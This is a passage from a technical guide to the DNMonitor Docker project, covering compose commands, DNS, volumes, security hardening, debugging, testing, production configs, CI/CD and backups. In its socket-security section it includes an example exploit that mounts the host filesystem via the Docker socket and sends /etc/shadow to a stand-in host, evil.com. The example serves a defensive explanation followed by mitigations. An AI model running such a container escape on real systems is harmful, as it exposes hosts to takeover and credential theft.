# - If still running, sends SIGKILL
# - Containers remain but are stopped

# 4. Complete teardown
docker compose down

# What happens:
# - Stops all containers (SIGTERM → SIGKILL)
# - Removes all containers
# - Removes networks
# - Does NOT remove volumes (need -v flag)
# - Does NOT remove images (need --rmi flag)

# 5. Restart single service
docker compose restart backend

# What happens:
# - Stops backend container (SIGTERM)
# - Starts backend container (same container, not recreated)
# - Useful for applying code changes in backend

# 6. Rebuild and restart
docker compose up -d --build --force-recreate backend

# What happens:
# - Rebuilds backend image from Dockerfile
# - Stops old backend container
# - Removes old backend container
# - Creates new backend container from new image
# - Starts new container

# 7. Scale services (horizontal scaling)
docker compose up -d --scale backend=3

# What happens:
# - Creates 2 additional backend containers
# - All share same image and config
# - Load balancing would be handled by nginx upstream
# - Each gets unique container name (backend_1, backend_2, backend_3)

# 8. View resource usage
docker compose stats

# What happens:
# - Reads cgroup metrics from /sys/fs/cgroup/
# - Shows CPU%, Memory usage, Network I/O, Block I/O
# - Updates in real-time
```

### 7.5 Service Discovery & DNS

**How services find each other:**

```
┌────────────────────────────────────────────────────┐
│         Docker's Embedded DNS Server                │
│              (runs at 127.0.0.11)                  │
└────────────────────────────────────────────────────┘
                      ↓
When container queries "backend":
┌────────────────────────────────────────────────────┐
│ 1. Container's /etc/resolv.conf points to          │
│    nameserver 127.0.0.11                           │
│                                                     │
│ 2. DNS query sent to Docker's DNS                 │
│    Question: What is IP of "backend"?              │
│                                                     │
│ 3. Docker checks network aliases                   │
│    - Service name: backend                         │
│    - Container name: dnmonitor-backend             │
│    - Network aliases: [backend]                    │
│                                                     │
│ 4. Returns container IP                            │
│    Answer: backend = 172.18.0.3                    │
│                                                     │
│ 5. Container connects to 172.18.0.3:4000          │
└────────────────────────────────────────────────────┘

Multiple instances (scaled):
┌────────────────────────────────────────────────────┐
│ Query: "backend"                                   │
│                                                     │
│ Docker returns ALL IPs (round-robin):              │
│ - 172.18.0.3                                       │
│ - 172.18.0.4                                       │
│ - 172.18.0.5                                       │
│                                                     │
│ Client gets different IP each query               │
│ = Built-in load balancing!                        │
└────────────────────────────────────────────────────┘
```

### 7.6 Volume Management Deep Dive

**Types of mounts in DNMonitor:**

```
1. BIND MOUNT (Frontend hot reload)
   ┌────────────────────────────────────────┐
   │ Host: /home/user/DNMonitor/frontend/   │
   │       ├── App.js                       │
   │       ├── package.json                 │
   │       └── ...                          │
   └────────────────────────────────────────┘
                 ↕ Bidirectional
   ┌────────────────────────────────────────┐
   │ Container: /app/                       │
   │            ├── App.js    ← Same inode! │
   │            ├── package.json            │
   │            └── ...                     │
   └────────────────────────────────────────┘
   
   Characteristics:
   - Direct access to host filesystem
   - Changes immediately visible in both
   - Uses host's inotify for file watching
   - Can override container files
   
2. NAMED VOLUME (Backend data persistence)
   ┌────────────────────────────────────────┐
   │ Docker-managed location:               │
   │ /var/lib/docker/volumes/               │
   │   dnmonitor_backend-data/_data/        │
   │     ├── db.sqlite                      │
   │     ├── uploads/                       │
   │     └── ...                            │
   └────────────────────────────────────────┘
                 ↕
   ┌────────────────────────────────────────┐
   │ Container: /app/data/                  │
   │            ├── db.sqlite               │
   │            ├── uploads/                │
   │            └── ...                     │
   └────────────────────────────────────────┘
   
   Characteristics:
   - Managed by Docker
   - Persists across container recreations
   - Can be backed up with docker commands
   - Isolated from host filesystem
   
3. TMPFS MOUNT (In-memory, not in DNMonitor but common)
   ┌────────────────────────────────────────┐
   │ RAM (temporary)                        │
   │ Lost on container stop!                │
   └────────────────────────────────────────┘
                 ↕
   ┌────────────────────────────────────────┐
   │ Container: /tmp/                       │
   │            ├── session-xyz             │
   │            └── cache-abc               │
   └────────────────────────────────────────┘
   
4. UNIX SOCKET MOUNT (Backend Docker access)
   ┌────────────────────────────────────────┐
   │ Host: /var/run/docker.sock             │
   │ (Unix socket file)                     │
   └────────────────────────────────────────┘
                 ↕ Pass-through
   ┌────────────────────────────────────────┐
   │ Container: /var/run/docker.sock        │
   │ (Same Unix socket!)                    │
   └────────────────────────────────────────┘
   
   Characteristics:
   - Not a regular file, it's an IPC socket
   - Connects to Docker daemon on host
   - Gives container full Docker control
   - SECURITY RISK if container compromised
```

---

## 8. Security & Access Control

### 8.1 Docker Socket Security Implications

**The /var/run/docker.sock Mount:**

```
┌────────────────────────────────────────────────────┐
│                   SECURITY RISK                     │
├────────────────────────────────────────────────────┤
│                                                     │
│  Backend container has Docker socket mounted       │
│  = Backend has ROOT access to host!                │
│                                                     │
│  What an attacker could do:                        │
│                                                     │
│  1. Compromise backend (SQL injection, etc.)       │
│                                                     │
│  2. Use Dockerode to execute:                      │
│     docker.run('alpine', ['cat', '/etc/shadow'],   │
│       { Binds: ['/:/host'] })                      │
│                                                     │
│  3. Now attacker can:                              │
│     • Read host's /etc/shadow (password hashes)    │
│     • Mount host's entire filesystem               │
│     • Start privileged containers                  │
│     • Access other containers' data                │
│     • Escape containerization entirely             │
│                                                     │
└────────────────────────────────────────────────────┘

Example exploit:
const Docker = require('dockerode');
const docker = new Docker({ socketPath: '/var/run/docker.sock' });

// Attacker creates privileged container with host filesystem mounted
await docker.run('alpine', [
  'sh', '-c', 
  'cat /host/etc/shadow && curl http://evil.com/exfil -d @/host/etc/shadow'
], process.stdout, {
  HostConfig: {
    Binds: ['/:/host'],
    Privileged: true
  }
});

// Host is now compromised!
```

**Mitigation Strategies:**

```
1. USE DOCKER-IN-DOCKER (DinD) instead
   ┌────────────────────────────────────────┐
   │ Host Docker                            │
   │  ├── Backend container                 │
   │  │   └── Runs its own Docker daemon    │
   │  │       (isolated from host)          │
   │  └── Other containers                  │
   └────────────────────────────────────────┘
   
   docker-compose.yml:
   backend:
     image: docker:dind
     privileged: true  # Still needed but more isolated
     environment:
       - DOCKER_TLS_CERTDIR=/certs
     volumes:
       - docker-certs:/certs

2. USE DOCKER SOCKET PROXY
   Add intermediary container that filters dangerous API calls
   
   docker-compose.yml:
   docker-proxy:
     image: tecnativa/docker-socket-proxy
     environment:
       - CONTAINERS=1  # Allow listing containers
       - SERVICES=0    # Deny service management
       - POST=0        # Deny all POST requests
     volumes:
       - /var/run/docker.sock:/var/run/docker.sock
   
   backend:
     environment:
       - DOCKER_HOST=tcp://docker-proxy:2375
     # No direct socket access!

3. USE KUBERNETES (PRODUCTION)
   Instead of Docker socket, use Kubernetes API
   - Proper RBAC (Role-Based Access Control)
   - Service accounts with limited permissions
   - Audit logging
   - Network policies

4. LEAST PRIVILEGE PRINCIPLE
   backend:
     cap_drop:
       - ALL  # Drop all capabilities
     cap_add:
       - NET_BIND_SERVICE  # Only add what's needed
     read_only: true  # Read-only root filesystem
     security_opt:
       - no-new-privileges:true
```

### 8.2 Network Security

**Network Isolation:**

```
┌────────────────────────────────────────────────────┐
│              CURRENT SETUP (Insecure)               │
├────────────────────────────────────────────────────┤
│                                                     │
│  All services on same network: dnmonitor_default   │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐         │
│  │ Frontend │──│ Backend  │──│  NGINX   │         │
│  └──────────┘  └──────────┘  └──────────┘         │
│       │             │              │               │
│       └─────────────┴──────────────┘               │
│         All can talk to each other                 │
│                                                     │
└────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────┐
│              IMPROVED SETUP (Secure)                │
├────────────────────────────────────────────────────┤
│                                                     │
│  Separate networks for different concerns          │
│                                                     │
│  ┌─────────────────────────────────────────────┐   │
│  │          Public Network (exposed)           │   │
│  │  ┌──────────┐                               │   │
│  │  │  NGINX   │                               │   │
│  │  └──────────┘                               │   │
│  └─────────┬───────────────────────────────────┘   │
│            │                                        │
│  ┌─────────┴───────────────────────────────────┐   │
│  │          Backend Network (internal)         │   │
│  │  ┌──────────┐  ┌──────────┐                │   │
│  │  │  NGINX   │──│ Backend  │                │   │
│  │  └──────────┘  └──────────┘                │   │
│  └─────────────────────────────────────────────┘   │
│                                                     │
│  ┌─────────────────────────────────────────────┐   │
│  │          Frontend Network (isolated)        │   │
│  │  ┌──────────┐                               │   │
│  │  │ Frontend │  (Can't reach backend!)       │   │
│  │  └──────────┘                               │   │
│  └─────────────────────────────────────────────┘   │
│                                                     │
└────────────────────────────────────────────────────┘

Implementation:
networks:
  frontend-net:
    driver: bridge
  backend-net:
    driver: bridge
    internal: true  # No external access

services:
  nginx:
    networks:
      - frontend-net
      - backend-net  # Bridge between networks
  
  backend:
    networks:
      - backend-net  # Only internal network
  
  frontend:
    networks:
      - frontend-net  # Only frontend network
```

### 8.3 Environment Variable Security

**Bad Practice (DNMonitor currently):**

```yaml
services:
  backend:
    environment:
      - NODE_ENV=development
      - DATABASE_PASSWORD=secret123  # EXPOSED IN COMPOSE FILE!
      - API_KEY=abc123xyz            # COMMITTED TO GIT!
```

**Good Practice:**

```yaml
# docker-compose.yml (committed to git)
services:
  backend:
    env_file:
      - .env  # NOT committed to git
    environment:
      - NODE_ENV=${NODE_ENV}

# .env file (in .gitignore)
NODE_ENV=production
DATABASE_PASSWORD=super_secret_password
API_KEY=real_api_key_here

# .gitignore
.env
.env.production
.env.local
```

**Best Practice (Docker Secrets):**

```yaml
# docker-compose.yml
version: '3.8'
services:
  backend:
    secrets:
      - db_password
      - api_key

secrets:
  db_password:
    file: ./secrets/db_password.txt
  api_key:
    file: ./secrets/api_key.txt

# In container, secrets available at:
# /run/secrets/db_password
# /run/secrets/api_key

# Node.js code:
const fs = require('fs');
const dbPassword = fs.readFileSync('/run/secrets/db_password', 'utf8').trim();
```

### 8.4 Container User Security

**Current Setup (Running as root - BAD):**

```
Dockerfile:
FROM node:18-alpine
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "index.js"]

# Container runs as root (UID 0)!
# If attacker breaks out, they're root on host
```

**Secure Setup (Non-root user):**

```dockerfile
FROM node:18-alpine

# Create non-root user
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001

WORKDIR /app

# Copy and install as root (needed for npm)
COPY package*.json ./
RUN npm ci --only=production && \
    npm cache clean --force

# Copy application
COPY --chown=nodejs:nodejs . .

# Switch to non-root user
USER nodejs

# Expose port >1024 (no root needed)
EXPOSE 4000

CMD ["node", "index.js"]
```

---

## 9. Development Workflow

### 9.1 Hot Reload Mechanism

**Frontend Hot Reload Flow:**

```
1. Developer edits App.js
   ┌────────────────────────────────────────┐
   │ Host: ~/DNMonitor/frontend/App.js      │
   │ Changed: Added new component           │
   └────────────────────────────────────────┘
              ↓ (inotify event)
   ┌────────────────────────────────────────┐
   │ Container: /app/App.js                 │
   │ Same file (bind mount)!                │
   └────────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────────┐
   │ Metro Bundler detects change           │
   │ (chokidar file watcher)                │
   └────────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────────┐
   │ Metro re-transforms App.js             │
   │ • Babel: JSX → JS                      │
   │ • Resolve new imports                  │
   │ • Update dependency graph              │
   └────────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────────┐
   │ Metro sends HMR update via WebSocket   │
   │ {                                      │
   │   type: 'update-start',                │
   │   body: { isInitialUpdate: false }     │
   │ }                                      │
   │ {                                      │
   │   type: 'update',                      │
   │   body: {                              │
   │     added: ['App.js'],                 │
   │     modified: ['App.js'],              │
   │     deleted: []                        │
   │   }                                    │
   │ }                                      │
   └────────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────────┐
   │ Browser receives update                │
   │ HMR runtime applies patch              │
   └────────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────────┐
   │ React Fast Refresh                     │
   │ • Preserves component state            │
   │ • Re-renders only changed components   │
   │ • No full page reload!                 │
   └────────────────────────────────────────┘

Total time: ~500ms (edit to browser update!)
```

**Backend Changes (Manual Restart):**

```
1. Developer edits backend/src/index.js
   ┌────────────────────────────────────────┐
   │ Changed: Added new API endpoint        │
   └────────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────────┐
   │ File changed via bind mount            │
   │ BUT: Node.js doesn't auto-reload       │
   └────────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────────┐
   │ Developer runs:                        │
   │ $ docker compose restart backend       │
   └────────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────────┐
   │ Container stops (SIGTERM)              │
   │ Container starts with new code         │
   │ Process restarts, loads new index.js   │
   └────────────────────────────────────────┘

To add auto-reload (nodemon):
Dockerfile:
RUN npm install -g nodemon
CMD ["nodemon", "src/index.js"]

# Now changes auto-detected and server restarts
```

### 9.2 Debugging Containerized Applications

**Debugging Backend:**

```bash
# Method 1: View logs
docker compose logs -f backend

# Method 2: Execute shell in running container
docker compose exec backend sh
# Now inside container
$ ps aux  # See running processes
$ curl localhost:4000/health  # Test endpoint locally
$ cat /proc/1/environ  # See environment variables
$ exit

# Method 3: Attach debugger (Node.js)
# Add to docker-compose.yml:
backend:
  command: node --inspect=0.0.0.0:9229 src/index.js
  ports:
    - "9229:9229"  # Debugger port

# In VS Code launch.json:
{
  "type": "node",
  "request": "attach",
  "name": "Docker: Attach to Node",
  "address": "localhost",
  "port": 9229,
  "localRoot": "${workspaceFolder}/backend/src",
  "remoteRoot": "/app/src",
  "protocol": "inspector"
}

# Set breakpoints in VS Code, they'll hit in container!

# Method 4: Network debugging
docker compose exec backend tcpdump -i eth0 -w /tmp/capture.pcap
# Analyze with Wireshark
```

**Debugging Frontend:**

```bash
# Method 1: Browser DevTools
# Open http://localhost:8081
# Press F12
# React DevTools extension shows component tree

# Method 2: Metro bundler logs
docker compose logs -f frontend
# Shows all network requests, transformations

# Method 3: React Native Debugger (standalone app)
# Install: https://github.com/jhen0409/react-native-debugger
# Connect to localhost:8081
# Full Redux DevTools, Network inspector, etc.

# Method 4: Console logging
# In App.js:
console.log('Container data:', containers);
// Appears in browser console AND Metro bundler logs
```

### 9.3 Testing Strategy

**Unit Tests (Backend):**

```javascript
// backend/tests/api.test.js
const request = require('supertest');
const app = require('../src/index');

describe('API Endpoints', () => {
  test('GET /api/containers returns array', async () => {
    const response = await request(app)
      .get('/api/containers')
      .expect('Content-Type', /json/)
      .expect(200);
    
    expect(Array.isArray(response.body)).toBe(true);
  });
  
  test('GET /health returns healthy status', async () => {
    const response = await request(app)
      .get('/health')
      .expect(200);
    
    expect(response.body.status).toBe('healthy');
  });
});

// Run tests:
// docker compose exec backend npm test
```

**Integration Tests:**

```javascript
// tests/integration.test.js
const axios = require('axios');

describe('Full Stack Integration', () => {
  const API_URL = 'http://localhost/api';
  
  test('Can fetch containers through nginx', async () => {
    const response = await axios.get(`${API_URL}/containers`);
    expect(response.status).toBe(200);
    expect(Array.isArray(response.data)).toBe(true);
  });
  
  test('CORS headers present', async () => {
    const response = await axios.get(`${API_URL}/containers`);
    expect(response.headers['access-control-allow-origin']).toBeDefined();
  });
});
```

**E2E Tests (Cypress):**

```javascript
// tests/e2e/containers.spec.js
describe('Container List', () => {
  it('loads and displays containers', () => {
    cy.visit('http://localhost:8081');
    cy.contains('Docker Container Monitor');
    cy.get('[data-testid=container-item]').should('have.length.greaterThan', 0);
  });
  
  it('can view container logs', () => {
    cy.visit('http://localhost:8081');
    cy.get('[data-testid=view-logs-button]').first().click();
    cy.contains('Container Logs');
    cy.get('[data-testid=logs-content]').should('not.be.empty');
  });
});
```

---

## 10. Production Considerations

### 10.1 Production Docker Compose

**docker-compose.prod.yml:**

```yaml
version: '3.8'

services:
  backend:
    build:
      context: ./backend
      dockerfile: Dockerfile.prod  # Multi-stage build
    restart: always  # Always restart on failure
    environment:
      - NODE_ENV=production
    env_file:
      - .env.production  # Separate prod secrets
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro  # Read-only!
      - backend-data:/app/data
    networks:
      - backend-net
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 512M
        reservations:
          cpus: '0.5'
          memory: 256M
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "5"
        labels: "service=backend"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:4000/health"]
      interval: 30s
      timeout: 5s
      retries: 3
      start_period: 60s
  
  frontend:
    build:
      context: ./frontend
      dockerfile: Dockerfile.prod
    restart: always
    environment:
      - NODE_ENV=production
      - REACT_APP_API_URL=https://your-domain.com/api
    networks:
      - frontend-net
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 256M
  
  nginx:
    build:
      context: ./nginx
      dockerfile: Dockerfile.prod
    restart: always
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/nginx.prod.conf:/etc/nginx/nginx.conf:ro
      - ./nginx/ssl:/etc/nginx/ssl:ro  # SSL certificates
      - nginx-cache:/var/cache/nginx
    networks:
      - frontend-net
      - backend-net
    depends_on:
      - backend
      - frontend
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 128M

volumes:
  backend-data:
    driver: local
  nginx-cache:
    driver: local

networks:
  frontend-net:
    driver: bridge
  backend-net:
    driver: bridge
    internal: true  # No external access
```

### 10.2 Production Dockerfile (Multi-stage Build)

**backend/Dockerfile.prod:**

```dockerfile
# Stage 1: Build
FROM node:18-alpine AS builder

WORKDIR /app

COPY package*.json ./
RUN npm ci --only=production && \
    npm cache clean --force

COPY src/ ./src/

# Stage 2: Production
FROM node:18-alpine

# Security: Run as non-root
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001

WORKDIR /app

# Copy only production dependencies
COPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules
COPY --chown=nodejs:nodejs src/ ./src/

USER nodejs

EXPOSE 4000

HEALTHCHECK --interval=30s --timeout=3s --retries=3 \
  CMD node -e "require('http').get('http://localhost:4000/health', (r) => process.exit(r.statusCode === 200 ? 0 : 1))"

CMD ["node", "src/index.js"]
```

### 10.3 NGINX Production Configuration

**nginx/nginx.prod.conf:**

```nginx
user nginx;
worker_processes auto;
error_log /var/log/nginx/error.log warn;
pid /var/run/nginx.pid;

events {
    worker_connections 2048;
    use epoll;
    multi_accept on;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    
    # Logging
    log_format json_combined escape=json
        '{'
            '"time_local":"$time_local",'
            '"remote_addr":"$remote_addr",'
            '"request":"$request",'
            '"status": "$status",'
            '"body_bytes_sent":"$body_bytes_sent",'
            '"request_time":"$request_time",'
            '"http_user_agent":"$http_user_agent"'
        '}';
    
    access_log /var/log/nginx/access.log json_combined;
    
    # Performance
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;
    client_max_body_size 20M;
    
    # Gzip
    gzip on;
    gzip_vary on;
    gzip_min_length 1000;
    gzip_comp_level 6;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
    
    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "no-referrer-when-downgrade" always;
    
    # Rate limiting
    limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    
    # Upstream with load balancing
    upstream backend {
        least_conn;  # Load balancing algorithm
        server backend:4000 max_fails=3 fail_timeout=30s;
        keepalive 32;
    }
    
    # HTTP server (redirect to HTTPS)
    server {
        listen 80;
        server_name your-domain.com;
        return 301 https://$server_name$request_uri;
    }
    
    # HTTPS server
    server {
        listen 443 ssl http2;
        server_name your-domain.com;
        
        # SSL certificates
        ssl_certificate /etc/nginx/ssl/fullchain.pem;
        ssl_certificate_key /etc/nginx/ssl/privkey.pem;
        
        # SSL configuration
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers HIGH:!aNULL:!MD5;
        ssl_prefer_server_ciphers on;
        ssl_session_cache shared:SSL:10m;
        ssl_session_timeout 10m;
        
        # HSTS
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        
        # Static files
        location / {
            root /usr/share/nginx/html;
            index index.html;
            try_files $uri $uri/ /index.html;
            
            # Cache static assets
            location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
                expires 1y;
                add_header Cache-Control "public, immutable";
            }
        }
        
        # API proxy
        location /api/ {
            # Rate limiting
            limit_req zone=api_limit burst=20 nodelay;
            limit_conn addr 10;
            
            proxy_pass http://backend/api/;
            
            # Headers
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # Timeouts
            proxy_connect_timeout 60s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
            
            # Buffering
            proxy_buffering on;
            proxy_buffer_size 4k;
            proxy_buffers 8 4k;
            
            # Connection pooling
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            
            # CORS (if backend doesn't handle)
            add_header 'Access-Control-Allow-Origin' 'https://your-domain.com' always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            
            if ($request_method = 'OPTIONS') {
                return 204;
            }
        }
        
        # Health check (no auth required)
        location /health {
            access_log off;
            proxy_pass http://backend/health;
        }
        
        # Metrics endpoint (internal only)
        location /nginx_status {
            stub_status on;
            allow 127.0.0.1;
            deny all;
        }
    }
}
```

### 10.4 Monitoring & Observability

**Implementing Logging:**

```javascript
// backend/src/logger.js
const winston = require('winston');

const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  defaultMeta: { service: 'dnmonitor-backend' },
  transports: [
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.simple()
      )
    }),
    new winston.transports.File({ 
      filename: '/app/logs/error.log', 
      level: 'error' 
    }),
    new winston.transports.File({ 
      filename: '/app/logs/combined.log' 
    })
  ]
});

module.exports = logger;

// Usage in backend/src/index.js
const logger = require('./logger');

app.get('/api/containers', async (req, res) => {
  logger.info('Fetching containers', { 
    ip: req.ip,
    userAgent: req.get('user-agent')
  });
  
  try {
    const containers = await docker.listContainers({ all: true });
    logger.info('Containers fetched successfully', { 
      count: containers.length 
    });
    res.json(formatted);
  } catch (error) {
    logger.error('Error fetching containers', { 
      error: error.message,
      stack: error.stack 
    });
    res.status(500).json({ error: error.message });
  }
});
```

**Adding Prometheus Metrics:**

```javascript
// backend/src/metrics.js
const promClient = require('prom-client');

// Create metrics registry
const register = new promClient.Registry();

// Default metrics (CPU, memory, etc.)
promClient.collectDefaultMetrics({ register });

// Custom metrics
const httpRequestDuration = new promClient.Histogram({
  name: 'http_request_duration_seconds',
  help: 'Duration of HTTP requests in seconds',
  labelNames: ['method', 'route', 'status_code'],
  buckets: [0.1, 0.5, 1, 2, 5]
});

const dockerContainerCount = new promClient.Gauge({
  name: 'docker_container_count',
  help: 'Number of Docker containers',
  labelNames: ['state']
});

const apiCallsTotal = new promClient.Counter({
  name: 'api_calls_total',
  help: 'Total number of API calls',
  labelNames: ['endpoint', 'method']
});

register.registerMetric(httpRequestDuration);
register.registerMetric(dockerContainerCount);
register.registerMetric(apiCallsTotal);

// Middleware to track metrics
function metricsMiddleware(req, res, next) {
  const start = Date.now();
  
  res.on('finish', () => {
    const duration = (Date.now() - start) / 1000;
    httpRequestDuration
      .labels(req.method, req.route?.path || req.path, res.statusCode)
      .observe(duration);
    
    apiCallsTotal
      .labels(req.path, req.method)
      .inc();
  });
  
  next();
}

// Endpoint to expose metrics
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});

module.exports = { metricsMiddleware, dockerContainerCount };
```

**Docker Compose with Prometheus & Grafana:**

```yaml
# docker-compose.monitoring.yml
version: '3.8'

services:
  prometheus:
    image: prom/prometheus:latest
    container_name: prometheus
    volumes:
      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus-data:/prometheus
    ports:
      - "9090:9090"
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.path=/prometheus'
    networks:
      - monitoring-net
  
  grafana:
    image: grafana/grafana:latest
    container_name: grafana
    volumes:
      - grafana-data:/var/lib/grafana
      - ./monitoring/grafana/dashboards:/etc/grafana/provisioning/dashboards
      - ./monitoring/grafana/datasources:/etc/grafana/provisioning/datasources
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
      - GF_USERS_ALLOW_SIGN_UP=false
    networks:
      - monitoring-net
  
  node-exporter:
    image: prom/node-exporter:latest
    container_name: node-exporter
    ports:
      - "9100:9100"
    networks:
      - monitoring-net
  
  cadvisor:
    image: gcr.io/cadvisor/cadvisor:latest
    container_name: cadvisor
    volumes:
      - /:/rootfs:ro
      - /var/run:/var/run:ro
      - /sys:/sys:ro
      - /var/lib/docker/:/var/lib/docker:ro
    ports:
      - "8080:8080"
    networks:
      - monitoring-net

volumes:
  prometheus-data:
  grafana-data:

networks:
  monitoring-net:
    driver: bridge
```

**Prometheus Configuration:**

```yaml
# monitoring/prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

scrape_configs:
  # DNMonitor backend metrics
  - job_name: 'dnmonitor-backend'
    static_configs:
      - targets: ['backend:4000']
    metrics_path: '/metrics'
  
  # Node exporter (host metrics)
  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']
  
  # cAdvisor (container metrics)
  - job_name: 'cadvisor'
    static_configs:
      - targets: ['cadvisor:8080']
  
  # NGINX metrics
  - job_name: 'nginx'
    static_configs:
      - targets: ['nginx:9113']
```

### 10.5 CI/CD Pipeline

**GitHub Actions Workflow:**

```yaml
# .github/workflows/deploy.yml
name: Build and Deploy

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '18'
    
    - name: Install backend dependencies
      working-directory: ./backend
      run: npm ci
    
    - name: Run backend tests
      working-directory: ./backend
      run: npm test
    
    - name: Install frontend dependencies
      working-directory: ./frontend
      run: npm ci
    
    - name: Run frontend tests
      working-directory: ./frontend
      run: npm test
  
  build:
    needs: test
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Docker Buildx
      uses: docker/setup-buildx-action@v2
    
    - name: Login to Docker Hub
      uses: docker/login-action@v2
      with:
        username: ${{ secrets.DOCKER_USERNAME }}
        password: ${{ secrets.DOCKER_PASSWORD }}
    
    - name: Build and push backend
      uses: docker/build-push-action@v4
      with:
        context: ./backend
        file: ./backend/Dockerfile.prod
        push: true
        tags: |
          yourusername/dnmonitor-backend:latest
          yourusername/dnmonitor-backend:${{ github.sha }}
        cache-from: type=registry,ref=yourusername/dnmonitor-backend:buildcache
        cache-to: type=registry,ref=yourusername/dnmonitor-backend:buildcache,mode=max
    
    - name: Build and push frontend
      uses: docker/build-push-action@v4
      with:
        context: ./frontend
        file: ./frontend/Dockerfile.prod
        push: true
        tags: |
          yourusername/dnmonitor-frontend:latest
          yourusername/dnmonitor-frontend:${{ github.sha }}
    
    - name: Build and push nginx
      uses: docker/build-push-action@v4
      with:
        context: ./nginx
        file: ./nginx/Dockerfile.prod
        push: true
        tags: |
          yourusername/dnmonitor-nginx:latest
          yourusername/dnmonitor-nginx:${{ github.sha }}
  
  deploy:
    needs: build
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Deploy to production
      uses: appleboy/ssh-action@master
      with:
        host: ${{ secrets.PRODUCTION_HOST }}
        username: ${{ secrets.PRODUCTION_USER }}
        key: ${{ secrets.SSH_PRIVATE_KEY }}
        script: |
          cd /opt/dnmonitor
          docker compose -f docker-compose.prod.yml pull
          docker compose -f docker-compose.prod.yml up -d
          docker system prune -f
```

### 10.6 Backup & Disaster Recovery

**Backup Strategy:**

```bash
#!/bin/bash
# scripts/backup.sh

BACKUP_DIR="/backups/dnmonitor"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="$BACKUP_DIR/backup_$TIMESTAMP.tar.gz"

# Create backup directory
mkdir -p $BACKUP_DIR

# Backup Docker volumes
echo "Backing up volumes..."
docker run --rm \
  -v dnmonitor_backend-data:/data \
  -v $BACKUP_DIR:/backup \
  alpine tar czf /backup/volumes_$TIMESTAMP.tar.gz /data

# Backup configuration files
echo "Backing up configuration..."
tar czf $BACKUP_DIR/config_$TIMESTAMP.tar.gz \
  docker-compose.yml \
  .env.production \
  nginx/

# Backup database (if applicable)
echo "Backing up database..."
docker compose exec -T backend \
  sh -c 'mongodump --archive' > $BACKUP_DIR/db_$TIMESTAMP.archive

# Upload to S3 (optional)
aws s3 cp $BACKUP_DIR/ s3://your-bucket/dnmonitor-backups/ --recursive

# Keep only last 7 days of backups
find $BACKUP_DIR -type f -mtime +7 -delete

echo "Backup completed: $BACKUP_FILE"
```

**Restore Script:**

```bash
#!/bin/bash
# scripts/restore.sh

BACKUP_FILE=$1

if [ -z "$BACKUP_FILE" ]; then
  echo "Usage: ./restore.sh <backup_file>"
  exit 1
fi

# Stop services
docker compose down

# Restore volumes
docker run --rm \
  -v dnmonitor_backend-data:/data \
  -v $(dirname $BACKUP_FILE):/backup \
  alpine tar xzf /backup/$(basename $BACKUP_FILE) -C /

# Restore database
docker compose up -d backend
docker compose exec -T backend \
  sh -c 'mongorestore --archive' < $BACKUP_FILE

# Start all services
docker compose up -d

echo "Restore completed"
```

### 10.7 Scaling Strategies

**Horizontal Scaling (Multiple Instances):**

```yaml
# docker-compose.scale.yml
version: '3.8'
